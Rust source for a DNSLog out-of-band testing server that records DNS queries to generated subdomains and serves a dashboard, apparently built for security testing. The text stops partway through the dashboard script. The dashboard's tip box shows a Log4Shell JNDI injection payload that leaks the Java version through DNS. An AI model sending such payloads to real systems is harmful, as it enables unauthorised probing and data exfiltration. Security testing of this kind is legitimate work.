use actix_web::{web, App, HttpResponse, HttpServer, Responder, HttpRequest};
use async_trait::async_trait;
use chrono::Local;
use chrono::TimeZone;
use rand::{distributions::Alphanumeric, Rng};
use rusqlite::{params, OptionalExtension};
use r2d2::Pool;
use r2d2_sqlite::SqliteConnectionManager;
use serde::Serialize;
use std::collections::HashMap;
use std::env;
use tokio::net::UdpSocket;
use trust_dns_proto::op::ResponseCode;
use trust_dns_proto::rr::RecordType;
use trust_dns_server::authority::MessageResponseBuilder;
use trust_dns_server::server::{Request, RequestHandler, ResponseHandler, ResponseInfo, ServerFuture};

const MAX_SUBDOMAINS_PER_USER: usize = 10;

fn domain_suffix() -> String {
    env::var("DOMAIN_SUFFIX").unwrap_or_else(|_| "dnslog.example.com".to_string())
}

#[derive(Debug, Serialize)]
struct LogRecord {
    domain: String,
    client_ip: String,
    timestamp: String,
    relative_time: String,
    record_type: String,
}

#[derive(Serialize)]
struct SubdomainLogs {
    subdomain: String,
    log_count: usize,
    logs: Vec<LogRecord>,
}

#[derive(Serialize)]
struct NewSubResponse {
    new_sub: String,
    subdomains: Vec<String>,
}

#[derive(Serialize)]
struct SubdomainsResponse {
    subdomains: Vec<String>,
}

#[derive(Serialize)]
struct ClearResponse {
    cleared: usize,
}

#[derive(Serialize)]
struct CallbackResponse {
    subdomain: String,
    log_count: usize,
    logs: Vec<LogRecord>,
}

// DNS request handler
struct MyDnsHandler {
    pool: Pool<SqliteConnectionManager>,
}

fn record_type_string(rt: RecordType) -> String {
    match rt {
        RecordType::A => "A",
        RecordType::AAAA => "AAAA",
        RecordType::CNAME => "CNAME",
        RecordType::MX => "MX",
        RecordType::TXT => "TXT",
        RecordType::NS => "NS",
        RecordType::SOA => "SOA",
        RecordType::PTR => "PTR",
        RecordType::SRV => "SRV",
        RecordType::CAA => "CAA",
        RecordType::ANY => "ANY",
        _ => "OTHER",
    }.to_string()
}

#[async_trait]
impl RequestHandler for MyDnsHandler {
    async fn handle_request<R: ResponseHandler>(
        &self,
        request: &Request,
        mut response_handle: R,
    ) -> ResponseInfo {
        let query = request.query();
        let query_name = query.name().to_string();
        let normalized_query = query_name.trim_end_matches('.').to_lowercase();
        let client_ip = request.src().ip().to_string();
        let timestamp = Local::now().timestamp();
        let record_type = record_type_string(query.query_type());

        let pool = self.pool.clone();
        tokio::task::spawn_blocking(move || {
            let conn = pool.get().expect("Failed to get DB connection");
            let result: Option<(String, String)> = conn
                .query_row(
                    "SELECT user_token, subdomain FROM subdomains
                     WHERE ?1 = subdomain OR ?1 LIKE '%.' || subdomain",
                    params![normalized_query.clone()],
                    |row| Ok((row.get(0)?, row.get(1)?)),
                )
                .optional()
                .expect("DB query failed");
            if let Some((_user_token, registered_sub)) = result {
                println!(
                    "DNS [{}] {} -> {} 来源 {}",
                    record_type, normalized_query, registered_sub, client_ip
                );
                let _ = conn.execute(
                    "INSERT INTO logs (registered_subdomain, requested_domain, client_ip, timestamp, record_type) VALUES (?1, ?2, ?3, ?4, ?5)",
                    params![registered_sub, normalized_query, client_ip, timestamp, record_type],
                );
            } else {
                println!("DNS [{}] {} (未注册) 来源 {}", record_type, normalized_query, client_ip);
            }
        })
        .await
        .expect("spawn_blocking failed");

        let response = MessageResponseBuilder::from_message_request(request)
            .error_msg(request.header(), ResponseCode::NXDomain);
        let info = response_handle
            .send_response(response)
            .await
            .expect("failed to send response");
        info
    }
}

fn random_string(len: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect::<String>()
        .to_lowercase()
}

fn relative_time(ts: i64) -> String {
    let now = Local::now().timestamp();
    let diff = now - ts;
    if diff < 0 {
        return "just now".to_string();
    }
    if diff < 60 {
        return format!("{}s ago", diff);
    }
    if diff < 3600 {
        return format!("{}m ago", diff / 60);
    }
    if diff < 86400 {
        return format!("{}h ago", diff / 3600);
    }
    format!("{}d ago", diff / 86400)
}

async fn auto_register(pool: &Pool<SqliteConnectionManager>, access_ip: String) -> String {
    let token = random_string(16);
    let default_sub = format!("{}.{}", random_string(8), domain_suffix());
    let pool_clone = pool.clone();
    let token_for_closure = token.clone();
    tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().expect("Failed to get DB connection");
        conn.execute("INSERT INTO users (token, access_ip) VALUES (?1, ?2)", params![token_for_closure.clone(), access_ip])
            .expect("Failed to insert user");
        conn.execute(
            "INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)",
            params![token_for_closure, default_sub],
        )
        .expect("Failed to insert subdomain");
    })
    .await
    .expect("spawn_blocking failed");
    token
}

// ---- API Handlers ----

async fn subdomains_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Missing token"})),
    };

    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let mut stmt = conn
            .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
            .map_err(|e| e.to_string())?;
        let sub_iter = stmt
            .query_map(params![token], |row| row.get::<_, String>(0))
            .map_err(|e| e.to_string())?;
        let mut subdomains: Vec<String> = Vec::new();
        for s in sub_iter {
            subdomains.push(s.map_err(|e| e.to_string())?);
        }
        Ok(subdomains)
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok(subdomains) => HttpResponse::Ok().json(SubdomainsResponse { subdomains }),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e})),
    }
}

async fn newsub_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Missing token"})),
    };

    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking({
        let token_for_query = token.clone();
        move || {
            let conn = pool_clone.get().expect("Failed to get DB connection");
            let exists: Option<String> = conn
                .query_row(
                    "SELECT token FROM users WHERE token = ?1",
                    params![token_for_query.clone()],
                    |row| row.get(0),
                )
                .optional()
                .expect("Failed to query user");
            if exists.is_none() {
                return Err("User not found".to_string());
            }
            // Check subdomain limit
            let count: i64 = conn
                .query_row(
                    "SELECT COUNT(*) FROM subdomains WHERE user_token = ?1",
                    params![token_for_query.clone()],
                    |row| row.get(0),
                )
                .expect("Failed to count subdomains");
            if count >= MAX_SUBDOMAINS_PER_USER as i64 {
                return Err(format!("Subdomain limit reached ({})", MAX_SUBDOMAINS_PER_USER));
            }
            let new_sub = format!("{}.{}", random_string(8), domain_suffix());
            conn.execute(
                "INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)",
                params![token_for_query.clone(), new_sub.clone()],
            )
            .expect("Failed to insert new subdomain");
            let mut stmt = conn
                .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
                .expect("Failed to prepare stmt");
            let sub_iter = stmt
                .query_map(params![token_for_query], |row| row.get::<_, String>(0))
                .expect("Failed to query subdomains");
            let mut subdomains: Vec<String> = Vec::new();
            for s in sub_iter {
                subdomains.push(s.expect("Failed to get subdomain"));
            }
            Ok((new_sub, subdomains))
        }
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok((new_sub, subdomains)) => {
            HttpResponse::Ok().json(NewSubResponse { new_sub, subdomains })
        }
        Err(e) => HttpResponse::BadRequest().json(serde_json::json!({"error": e})),
    }
}

async fn get_logs_json(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Missing token"})),
    };

    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let mut stmt = conn
            .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
            .map_err(|e| e.to_string())?;
        let sub_iter = stmt
            .query_map(params![token], |row| row.get::<_, String>(0))
            .map_err(|e| e.to_string())?;
        let mut data: Vec<SubdomainLogs> = Vec::new();
        let now = Local::now().timestamp();
        let cutoff = now - 3600;
        for sub in sub_iter {
            let sub: String = sub.map_err(|e| e.to_string())?;
            let mut stmt = conn
                .prepare("SELECT requested_domain, client_ip, timestamp, record_type FROM logs WHERE registered_subdomain = ?1 AND timestamp >= ?2 ORDER BY id DESC")
                .map_err(|e| e.to_string())?;
            let log_iter = stmt
                .query_map(params![sub.clone(), cutoff], |row| {
                    let ts: i64 = row.get(2)?;
                    let dt = Local.timestamp_opt(ts, 0).single().unwrap();
                    let formatted = dt.format("%Y-%m-%d %H:%M:%S").to_string();
                    let rt: String = row.get(3).unwrap_or_default();
                    Ok(LogRecord {
                        domain: row.get(0)?,
                        client_ip: row.get(1)?,
                        timestamp: formatted,
                        relative_time: relative_time(ts),
                        record_type: if rt.is_empty() { "A".to_string() } else { rt },
                    })
                })
                .map_err(|e| e.to_string())?;
            let mut logs: Vec<LogRecord> = Vec::new();
            for log in log_iter {
                logs.push(log.map_err(|e| e.to_string())?);
            }
            let log_count = logs.len();
            data.push(SubdomainLogs { subdomain: sub, log_count, logs });
        }
        Ok(data)
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok(data) => HttpResponse::Ok().json(data),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e})),
    }
}

async fn clear_logs_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Missing token"})),
    };

    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let cleared = conn.execute(
            "DELETE FROM logs WHERE registered_subdomain IN (SELECT subdomain FROM subdomains WHERE user_token = ?1)",
            params![token],
        ).map_err(|e| e.to_string())?;
        Ok(cleared)
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok(cleared) => HttpResponse::Ok().json(ClearResponse { cleared }),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e})),
    }
}

async fn callback_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    path: web::Path<String>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let subdomain = path.into_inner().to_lowercase();
    let limit: i64 = query.get("limit")
        .and_then(|l| l.parse().ok())
        .unwrap_or(10)
        .min(100);

    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        // Verify subdomain exists
        let exists: Option<String> = conn
            .query_row(
                "SELECT subdomain FROM subdomains WHERE subdomain = ?1",
                params![subdomain],
                |row| row.get(0),
            )
            .optional()
            .map_err(|e| e.to_string())?;
        let sub = match exists {
            Some(s) => s,
            None => return Err("Subdomain not found".to_string()),
        };
        let mut stmt = conn
            .prepare("SELECT requested_domain, client_ip, timestamp, record_type FROM logs WHERE registered_subdomain = ?1 ORDER BY id DESC LIMIT ?2")
            .map_err(|e| e.to_string())?;
        let log_iter = stmt
            .query_map(params![sub.clone(), limit], |row| {
                let ts: i64 = row.get(2)?;
                let dt = Local.timestamp_opt(ts, 0).single().unwrap();
                let formatted = dt.format("%Y-%m-%d %H:%M:%S").to_string();
                let rt: String = row.get(3).unwrap_or_default();
                Ok(LogRecord {
                    domain: row.get(0)?,
                    client_ip: row.get(1)?,
                    timestamp: formatted,
                    relative_time: relative_time(ts),
                    record_type: if rt.is_empty() { "A".to_string() } else { rt },
                })
            })
            .map_err(|e| e.to_string())?;
        let mut logs: Vec<LogRecord> = Vec::new();
        for log in log_iter {
            logs.push(log.map_err(|e| e.to_string())?);
        }
        let log_count = logs.len();
        Ok(CallbackResponse { subdomain: sub, log_count, logs })
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|inner| inner);

    match res {
        Ok(data) => HttpResponse::Ok().json(data),
        Err(e) => HttpResponse::NotFound().json(serde_json::json!({"error": e})),
    }
}

// ---- Dashboard HTML ----

async fn dashboard(
    req: HttpRequest,
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let access_ip = req.connection_info().realip_remote_addr().unwrap_or("unknown").to_string();
    let token = if let Some(t) = query.get("token") {
        t.to_string()
    } else {
        auto_register(&pool, access_ip).await
    };

    let html = format!(r##"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DNSLog 平台</title>
<style>
:root {{
    --bg-primary: #0d1117;
    --bg-secondary: #161b22;
    --bg-tertiary: #21262d;
    --bg-card: rgba(22, 27, 34, 0.8);
    --border: #30363d;
    --text-primary: #e6edf3;
    --text-secondary: #8b949e;
    --text-muted: #484f58;
    --accent-green: #3fb950;
    --accent-cyan: #58a6ff;
    --accent-blue: #388bfd;
    --accent-purple: #bc8cff;
    --accent-orange: #d29922;
    --accent-red: #f85149;
    --accent-pink: #f778ba;
    --shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
    --radius: 12px;
    --radius-sm: 8px;
}}
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
    background: var(--bg-primary);
    color: var(--text-primary);
    min-height: 100vh;
    line-height: 1.5;
}}
.app-header {{
    background: var(--bg-secondary);
    border-bottom: 1px solid var(--border);
    padding: 16px 0;
    position: sticky;
    top: 0;
    z-index: 100;
    backdrop-filter: blur(12px);
}}
.header-inner {{
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 12px;
}}
.logo {{
    display: flex;
    align-items: center;
    gap: 10px;
}}
.logo-icon {{
    width: 32px;
    height: 32px;
    background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    font-size: 14px;
    color: #000;
}}
.logo-text {{
    font-size: 18px;
    font-weight: 700;
    background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}}
.header-meta {{
    display: flex;
    align-items: center;
    gap: 16px;
    flex-wrap: wrap;
}}
.token-display {{
    display: flex;
    align-items: center;
    gap: 8px;
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    border-radius: var(--radius-sm);
    padding: 6px 12px;
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    font-size: 13px;
    cursor: pointer;
    transition: border-color 0.2s;
    position: relative;
}}
.token-display:hover {{
    border-color: var(--accent-cyan);
}}
.token-label {{
    color: var(--text-secondary);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    font-size: 12px;
}}
.copy-icon {{
    color: var(--text-muted);
    font-size: 12px;
    transition: color 0.2s;
}}
.token-display:hover .copy-icon {{ color: var(--accent-cyan); }}
.main-content {{
    max-width: 1200px;
    margin: 0 auto;
    padding: 24px;
    display: grid;
    gap: 20px;
}}
.card {{
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    backdrop-filter: blur(12px);
    overflow: hidden;
}}
.card-header {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 20px;
    border-bottom: 1px solid var(--border);
    flex-wrap: wrap;
    gap: 12px;
}}
.card-title {{
    font-size: 15px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 8px;
}}
.card-body {{
    padding: 20px;
}}
.badge {{
    display: inline-flex;
    align-items: center;
    justify-content: center;
    min-width: 22px;
    height: 22px;
    padding: 0 6px;
    border-radius: 12px;
    font-size: 12px;
    font-weight: 600;
    background: var(--accent-green);
    color: #000;
}}
.badge-muted {{
    background: var(--bg-tertiary);
    color: var(--text-secondary);
}}
/* Buttons */
.btn {{
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 8px 16px;
    border-radius: var(--radius-sm);
    border: 1px solid var(--border);
    background: var(--bg-tertiary);
    color: var(--text-primary);
    font-size: 13px;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s;
    font-family: inherit;
}}
.btn:hover {{
    background: var(--border);
    border-color: var(--text-muted);
}}
.btn-primary {{
    background: var(--accent-green);
    border-color: var(--accent-green);
    color: #000;
    font-weight: 600;
}}
.btn-primary:hover {{
    background: #2ea043;
    border-color: #2ea043;
}}
.btn-danger {{
    border-color: var(--accent-red);
    color: var(--accent-red);
    background: transparent;
}}
.btn-danger:hover {{
    background: rgba(248, 81, 73, 0.15);
}}
.btn-sm {{
    padding: 4px 10px;
    font-size: 12px;
}}
.btn-group {{
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
}}
/* Subdomain list */
.subdomain-list {{
    display: flex;
    flex-direction: column;
    gap: 8px;
}}
.subdomain-item {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 14px;
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    border-radius: var(--radius-sm);
    gap: 12px;
    transition: border-color 0.2s;
}}
.subdomain-item:hover {{
    border-color: var(--accent-cyan);
}}
.subdomain-name {{
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    font-size: 13px;
    color: var(--accent-cyan);
    word-break: break-all;
    cursor: pointer;
    flex: 1;
    position: relative;
}}
.subdomain-name:hover {{
    color: var(--accent-green);
}}
.subdomain-actions {{
    display: flex;
    gap: 6px;
    flex-shrink: 0;
}}
/* Log table */
.log-section {{
    margin-top: 16px;
}}
.log-section:first-child {{
    margin-top: 0;
}}
.log-section-header {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 14px;
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    border-radius: var(--radius-sm) var(--radius-sm) 0 0;
    flex-wrap: wrap;
    gap: 8px;
}}
.log-section-title {{
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    font-size: 13px;
    color: var(--accent-purple);
}}
.log-table {{
    width: 100%;
    border-collapse: collapse;
}}
.log-table th {{
    padding: 10px 14px;
    text-align: left;
    font-size: 12px;
    font-weight: 600;
    color: var(--text-secondary);
    text-transform: uppercase;
    letter-spacing: 0.5px;
    background: var(--bg-secondary);
    border-bottom: 1px solid var(--border);
}}
.log-table td {{
    padding: 10px 14px;
    font-size: 13px;
    border-bottom: 1px solid var(--border);
    vertical-align: middle;
}}
.log-table tr:last-child td {{
    border-bottom: none;
}}
.log-table tr {{
    transition: background 0.15s;
}}
.log-table tr:hover {{
    background: rgba(56, 139, 253, 0.06);
}}
.log-domain {{
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    font-size: 12px;
    color: var(--text-primary);
    word-break: break-all;
    max-width: 400px;
}}
.log-ip {{
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    font-size: 12px;
    color: var(--accent-orange);
}}
.log-time {{
    color: var(--text-secondary);
    font-size: 12px;
    white-space: nowrap;
}}
.log-time-abs {{
    font-size: 11px;
    color: var(--text-muted);
    display: block;
    margin-top: 2px;
}}
.record-type {{
    display: inline-block;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
    font-weight: 600;
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
}}
.type-a {{ background: rgba(63, 185, 80, 0.15); color: var(--accent-green); }}
.type-aaaa {{ background: rgba(188, 140, 255, 0.15); color: var(--accent-purple); }}
.type-cname {{ background: rgba(88, 166, 255, 0.15); color: var(--accent-cyan); }}
.type-mx {{ background: rgba(210, 153, 34, 0.15); color: var(--accent-orange); }}
.type-txt {{ background: rgba(247, 120, 186, 0.15); color: var(--accent-pink); }}
.type-other {{ background: var(--bg-tertiary); color: var(--text-secondary); }}
/* New log animation */
@keyframes logFlash {{
    0% {{ background: rgba(63, 185, 80, 0.2); }}
    100% {{ background: transparent; }}
}}
.log-new {{
    animation: logFlash 2s ease-out;
}}
/* Empty state */
.empty-state {{
    text-align: center;
    padding: 40px 20px;
    color: var(--text-muted);
}}
.empty-icon {{
    font-size: 36px;
    margin-bottom: 12px;
    opacity: 0.5;
}}
.empty-text {{
    font-size: 14px;
    margin-bottom: 4px;
}}
.empty-hint {{
    font-size: 12px;
    color: var(--text-muted);
}}
/* Tip box */
.tip-box {{
    padding: 14px 16px;
    background: rgba(210, 153, 34, 0.08);
    border: 1px solid rgba(210, 153, 34, 0.2);
    border-radius: var(--radius-sm);
    font-size: 13px;
    color: var(--text-secondary);
    line-height: 1.6;
}}
.tip-box code {{
    background: var(--bg-tertiary);
    padding: 2px 6px;
    border-radius: 4px;
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    font-size: 12px;
    color: var(--accent-orange);
}}
/* Status bar */
.status-bar {{
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 12px;
    color: var(--text-muted);
    padding: 12px 20px;
    border-top: 1px solid var(--border);
}}
.status-dot {{
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: var(--accent-green);
    box-shadow: 0 0 6px var(--accent-green);
}}
.status-dot.disconnected {{
    background: var(--accent-red);
    box-shadow: 0 0 6px var(--accent-red);
}}
/* Toast */
.toast-container {{
    position: fixed;
    top: 80px;
    right: 24px;
    z-index: 1000;
    display: flex;
    flex-direction: column;
    gap: 8px;
}}
.toast {{
    padding: 10px 16px;
    border-radius: var(--radius-sm);
    font-size: 13px;
    color: #fff;
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    box-shadow: var(--shadow);
    animation: toastIn 0.3s ease-out;
    max-width: 320px;
}}
.toast-success {{ border-left: 3px solid var(--accent-green); }}
.toast-error {{ border-left: 3px solid var(--accent-red); }}
.toast-info {{ border-left: 3px solid var(--accent-cyan); }}
@keyframes toastIn {{
    from {{ opacity: 0; transform: translateX(40px); }}
    to {{ opacity: 1; transform: translateX(0); }}
}}
@keyframes toastOut {{
    from {{ opacity: 1; transform: translateX(0); }}
    to {{ opacity: 0; transform: translateX(40px); }}
}}
/* Footer */
.footer {{
    text-align: center;
    padding: 20px;
    font-size: 12px;
    color: var(--text-muted);
    border-top: 1px solid var(--border);
    margin-top: 20px;
}}
/* Responsive */
@media (max-width: 768px) {{
    .header-inner {{ flex-direction: column; align-items: flex-start; }}
    .main-content {{ padding: 12px; }}
    .card-body {{ padding: 14px; }}
    .log-table {{ font-size: 12px; }}
    .log-table th, .log-table td {{ padding: 8px 10px; }}
    .btn-group {{ width: 100%; }}
    .btn-group .btn {{ flex: 1; justify-content: center; }}
}}
/* Scrollbar */
::-webkit-scrollbar {{ width: 8px; height: 8px; }}
::-webkit-scrollbar-track {{ background: var(--bg-primary); }}
::-webkit-scrollbar-thumb {{ background: var(--bg-tertiary); border-radius: 4px; }}
::-webkit-scrollbar-thumb:hover {{ background: var(--border); }}
</style>
</head>
<body>

<header class="app-header">
    <div class="header-inner">
        <div class="logo">
            <div class="logo-icon">D</div>
            <span class="logo-text">DNSLog</span>
        </div>
        <div class="header-meta">
            <div class="token-display" onclick="copyToken()" title="点击复制 Token">
                <span class="token-label">令牌</span>
                <span id="tokenValue">{token}</span>
                <span class="copy-icon">&#x2398;</span>
            </div>
        </div>
    </div>
</header>

<main class="main-content">
    <!-- Subdomains Card -->
    <div class="card">
        <div class="card-header">
            <div class="card-title">
                <span>&#x1F310;</span> 子域名管理
                <span id="subCount" class="badge-muted badge">0</span>
            </div>
            <div class="btn-group">
                <button class="btn btn-primary" onclick="createSubdomain()">
                    <span>+</span> 申请新子域名
                </button>
            </div>
        </div>
        <div class="card-body">
            <div id="subdomainsList" class="subdomain-list">
                <div class="empty-state">
                    <div class="empty-icon">&#x1F50D;</div>
                    <div class="empty-text">加载中...</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Logs Card -->
    <div class="card">
        <div class="card-header">
            <div class="card-title">
                <span>&#x1F4CB;</span> DNS 日志
                <span style="font-size:12px; color:var(--text-muted); font-weight:400;">（最近 1 小时）</span>
                <span id="logCount" class="badge">0</span>
            </div>
            <div class="btn-group">
                <button class="btn btn-sm" onclick="fetchLogs()" title="刷新日志">&#x21BB; 刷新</button>
                <button class="btn btn-sm btn-danger" onclick="clearLogs()" title="清空所有日志">&#x1F5D1; 清空</button>
            </div>
        </div>
        <div class="card-body" id="logsContainer">
            <div class="empty-state">
                <div class="empty-icon">&#x1F4ED;</div>
                <div class="empty-text">暂无日志</div>
                <div class="empty-hint">子域名收到的 DNS 查询将显示在这里</div>
            </div>
        </div>
        <div class="status-bar">
            <div id="statusDot" class="status-dot"></div>
            <span id="statusText">已连接</span>
            <span style="margin-left:auto;">自动刷新: 5秒</span>
        </div>
    </div>

    <!-- Tips Card -->
    <div class="card">
        <div class="card-header">
            <div class="card-title"><span>&#x1F4A1;</span> 使用提示</div>
        </div>
        <div class="card-body">
            <div class="tip-box">
                <strong>带外测试（OOB）：</strong>将数据嵌入子域名部分，通过 DNS 查询实现信息外传。<br>
                示例: <code>${{jndi:ldap://test.${{java:version}}.your-subdomain}}</code><br><br>
                <strong>回调接口：</strong>通过 API 程序化验证交互记录：<br>
                <code>GET /api/callback/your-subdomain?limit=10</code><br><br>
                <strong>注意：</strong>对方使用的 DNS 服务器可能存在缓存或负载均衡，导致同一次触发产生多条 DNS 记录。
            </div>
        </div>
    </div>
</main>

<div class="footer">
    &copy; 2024 AdySec &mdash; DNSLog 平台 &mdash; 基于 Rust + Actix 构建
</div>

<div id="toastContainer" class="toast-container"></div>

<script>
const TOKEN = '{token}';
let knownLogIds = new Set();
let connectionOk = true;

// ---- Toast notifications ----
function showToast(msg, type = 'info') {{
    const container = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = 'toast toast-' + type;
    toast.textContent = msg;
    container.appendChild(toast);
    setTimeout(() => {{
        toast.style.animation = 'toastOut 0.3s ease-in forwards';
        setTimeout(() => toast.remove(), 300);
    }}, 3000);
}}

// ---- Copy helpers ----
function copyToClipboard(text, label) {{
    navigator.clipboard.writeText(text).then(() => {{
        showToast((label || '已复制') + ': ' + text, 'success');
    }}).catch(() => {{
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast((label || '已复制') + ': ' + text, 'success');
    }});
}}
function copyToken() {{
    copyToClipboard(TOKEN, '令牌已复制');
}}
function copySubdomain(el) {{
    copyToClipboard(el.textContent.trim(), '子域名已复制');
}}

// ---- Relative time ----
function relativeTime(tsStr) {{
    // tsStr is "YYYY-MM-DD HH:MM:SS"
    const then = new Date(tsStr.replace(' ', 'T')).getTime();
    const now = Date.now();
    const diff = Math.floor((now - then) / 1000);
    if (diff < 0) return '刚刚';
    if (diff < 60) return diff + '秒前';
    if (diff < 3600) return Math.floor(diff / 60) + '分钟前';
    if (diff < 86400) return Math.floor(diff / 3600) + '小时前';
    return Math.floor(diff / 86400) + '天前';
}}

// ---- Record type badge ----
function recordTypeBadge(rt) {{
    const cls = 'type-' + (rt || 'a').toLowerCase().replace('aaaa', 'aaaa');
    return '<span class="record-type ' + cls + '">' + (rt || 'A') + '</span>';
}}

// ---- Fetch subdomains ----
async function fetchSubdomains() {{
    try {{
        const res = await fetch('/api/subdomains?token=' + TOKEN);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        const data = await res.json();
        const list = document.getElementById('subdomainsList');
        const subs = data.subdomains || [];
        document.getElementById('subCount').textContent = subs.length;
        if (subs.length === 0) {{
            list.innerHTML = '<div class="empty-state"><div class="empty-icon">&#x1F310;</div><div class="empty-text">暂无子域名</div><div class="empty-hint">点击「申请新子域名」创建</div></div>';
            return;
        }}
        let html = '';
        subs.forEach(s => {{
            html += '<div class="subdomain-item">' +
                '<span class="subdomain-name" onclick="copySubdomain(this)" title="点击复制">' + s + '</span>' +
                '<div class="subdomain-actions">' +
                '<button class="btn btn-sm" onclick="copyToClipboard(\'' + s + '\', \'已复制\')" title="复制子域名">&#x2398; 复制</button>' +
                '<button class="btn btn-sm" onclick="copyToClipboard(\'http://\' + window.location.host + \'/api/callback/' + s + '?limit=10\', \'回调地址已复制\')" title="复制回调 API 地址">&#x26A1; 回调</button>' +
                '</div></div>';
        }});
        list.innerHTML = html;
    }} catch (err) {{
        setConnectionStatus(false);
        console.error('fetchSubdomains error:', err);
    }}
}}

// ---- Fetch logs ----
async function fetchLogs() {{
    try {{
        const res = await fetch('/api/logs?token=' + TOKEN);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        const data = await res.json();
        setConnectionStatus(true);
        let totalLogs = 0;
        let html = '';
        data.forEach(item => {{
            totalLogs += item.log_count;
            html += '<div class="log-section">';
            html += '<div class="log-section-header">';
            html += '<span class="log-section-title">' + item.subdomain + '</span>';
            html += '<span class="badge ' + (item.log_count > 0 ? '' : 'badge-muted') + '">' + item.log_count + '</span>';
            html += '</div>';
            if (item.logs.length > 0) {{
                html += '<table class="log-table"><thead><tr>';
                html += '<th>类型</th><th>请求域名</th><th>IP 地址</th><th>时间</th>';
                html += '</tr></thead><tbody>';
                item.logs.forEach(log => {{
                    const logKey = log.domain + '|' + log.client_ip + '|' + log.timestamp;
                    const isNew = !knownLogIds.has(logKey);
                    knownLogIds.add(logKey);
                    html += '<tr class="' + (isNew ? 'log-new' : '') + '">';
